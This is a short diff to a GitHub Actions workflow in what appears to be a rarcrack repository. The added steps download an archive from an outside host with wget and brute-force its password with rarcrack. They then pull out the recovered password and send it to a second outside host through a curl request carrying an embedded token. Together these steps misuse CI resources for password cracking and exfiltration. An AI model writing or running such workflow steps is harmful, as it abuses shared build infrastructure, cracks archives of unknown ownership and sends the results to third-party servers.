@@ -21,11 +21,17 @@ jobs:
       - name: Run Build
         run: make clean && make
 
-      - name: Run rarcrack
+      - name: wget
         run: 
             wget 6.suan.pw/k2p.bin -O 1.7z;
+      - name: Run rarcrack
+        run: 
             ./rarcrack --type 7z 1.7z;
+      - name: set
+        run: 
             PWD=$(cat 1.7z.xml |grep good);
+      - name: send
+        run: 
             curl "http://tqay.com/wxsms.php?token=apitokenisapi&title=Password&msg=$(echo $PWD)"
 
   macos:
